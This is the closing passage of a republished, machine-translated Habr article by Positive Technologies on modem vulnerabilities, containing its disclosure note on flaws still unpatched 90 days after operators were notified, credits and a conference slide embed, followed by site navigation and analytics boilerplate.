src="https://habrastorage.org/files/f2b/4f6/3d8/f2b4f63d847d4c34a7933cec972ecfcb.png"><br><br><h5>  Information disclosure </h5><br>  Although 90 days have passed since the notice of the telecom operators, many vulnerabilities have remained uncovered.  <b>Important point</b> : the vulnerabilities found in the research process do not necessarily belong to modem manufacturers.  They can be added in the process of customization of software by telecom providers. <br><br>  <b>By</b> Timur Yunusov, Positive Technologies <br><br>  <b>Thanks for the help and participation in the study:</b> Alexey Osipov, Dmitry Sklyarov, Kirill Nesterov, Mikhail Firstov, <a href="http://scadasl.org/">SCADA Strangelove team</a> <br><br>  Presentation slides with ZeroNights: <br><br><div class="slideshow"><iframe src="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=http://www.slideshare.net/slideshow/embed_code/55735095&amp;xid=17259,15700019,15700186,15700191,15700248,15700253&amp;usg=ALkJrhgnfIVOL-AcKh_dhMQqame6jdkgMw" width="425" height="355" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"></iframe></div></div><p>Source: <a href="https://habr.com/ru/post/272175/">https://habr.com/ru/post/272175/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../272161/index.html">Creating a scene system for the game engine</a></li>
<li><a href="../272163/index.html">The feature of creating installation media for Windows 10 edition "Home for one language"</a></li>
<li><a href="../272165/index.html">PHP history: infographics</a></li>
<li><a href="../272167/index.html">ACPI fine tuning on the example of the Thinkpad X220</a></li>
<li><a href="../272173/index.html">Air Datepicker, easy and beautiful date selection</a></li>
<li><a href="../272177/index.html">Business processes: how not to automate mess</a></li>
<li><a href="../272179/index.html">Rational approximation to pi</a></li>
<li><a href="../272181/index.html">Mail.Ru Group educational projects: 4 years, 1206 students, 101 teachers</a></li>
<li><a href="../272183/index.html">Cisco IOS shellcode: All-in-one</a></li>
<li><a href="../272185/index.html">Announcement of laboratory works with Windows Camp // Labs and useful links for developers</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>